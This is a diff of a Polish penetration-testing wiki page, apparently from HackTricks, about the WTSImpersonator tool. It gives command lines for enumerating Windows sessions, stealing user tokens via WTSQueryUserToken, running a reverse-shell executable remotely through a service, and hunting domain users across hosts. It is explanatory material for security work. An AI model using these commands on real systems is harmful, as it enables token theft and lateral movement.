@@ -2,53 +2,53 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Narzędzie **WTS Impersonator** wykorzystuje potok nazwany RPC **"\\pipe\LSM_API_service"**, aby w sposób ukryty enumerować zalogowanych użytkowników i przejmować ich tokeny, omijając tradycyjne techniki **Token Impersonation**. Takie podejście ułatwia płynne przeprowadzanie lateral movements w sieciach. Autorstwo tej innowacyjnej techniki przypisuje się **Omri Baso**, którego praca jest dostępna na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.**<sup>[[1]](#references)</sup>
+**WTSImpersonator**, autorstwa Omriego Baso, wykorzystuje API Windows Terminal Services udostępnione przez named pipe RPC `\\pipe\LSM_API_service` do enumeracji zalogowanych sesji i uruchamiania procesu z tokenem wybranego użytkownika. Obsługuje lokalną enumerację i wykonywanie, a także zdalne przepływy pracy oparte na usługach.<sup>[[1]](#references)</sup>
 
-### Główne funkcje
+## Główne funkcje
 
-Narzędzie działa poprzez sekwencję wywołań API:
-```bash
+Jego lokalny przepływ wykonywania wykorzystuje następującą sekwencję API:<sup>[[1]](#references)[[2]](#references)</sup>
+```text
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Kluczowe moduły i użycie
+## Moduły i użycie
 
-- **Enumerowanie użytkowników**: Za pomocą narzędzia możliwe jest lokalne i zdalne enumerowanie użytkowników, przy użyciu poleceń dla obu scenariuszy:
+- **Enumerowanie użytkowników:** Narzędzie może enumerować sesje na lokalnym lub zdalnym hoście.
 
 - Lokalnie:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Zdalnie, poprzez określenie adresu IP lub nazwy hosta:
+- Zdalnie, określając adres IP lub nazwę hosta:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Wykonywanie poleceń**: Moduły `exec` i `exec-remote` wymagają do działania kontekstu **Service**. Lokalne wykonanie wymaga jedynie pliku wykonywalnego WTSImpersonator oraz polecenia:
+- **Wykonywanie poleceń:** Moduły `exec` i `exec-remote` wymagają kontekstu usługi. Firma Microsoft dokumentuje, że `WTSQueryUserToken` wymaga, aby wywołujący działał jako `LocalSystem` z uprawnieniem `SE_TCB_NAME`.<sup>[[2]](#references)</sup>
 
-- Przykład lokalnego wykonywania polecenia:
+- Lokalne wykonywanie poleceń:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- PsExec64.exe może zostać użyty do uzyskania kontekstu Service:
+- PsExec może uruchomić wiersz poleceń `LocalSystem` na potrzeby testów:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Zdalne wykonywanie poleceń**: Obejmuje zdalne utworzenie i zainstalowanie usługi, podobnie jak w przypadku PsExec.exe, co umożliwia wykonywanie poleceń z odpowiednimi uprawnieniami.
+- **Zdalne wykonywanie poleceń:** Tryb zdalny tworzy usługę na celu w przepływie pracy podobnym do PsExec, dlatego wymaga uprawnień do instalowania i uruchamiania tej usługi.<sup>[[1]](#references)</sup>
 
-- Przykład zdalnego wykonywania:
+- Przykład:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Moduł User Hunting**: Wyszukuje określonych użytkowników na wielu komputerach, wykonując kod przy użyciu ich poświadczeń. Jest to szczególnie przydatne podczas atakowania Domain Admins posiadających lokalne uprawnienia administratora w kilku systemach.
+- **Wyszukiwanie użytkowników:** Moduł `user-hunter` przeszukuje listę hostów w poszukiwaniu sesji określonego użytkownika i próbuje wykonać dostarczony program w tym kontekście.<sup>[[1]](#references)</sup>
 - Przykład użycia:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
-## Odnośniki
+## References
 
-- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
-
+- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
+- [2] [Microsoft: funkcja `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
 {{#include ../../banners/hacktricks-training.md}}
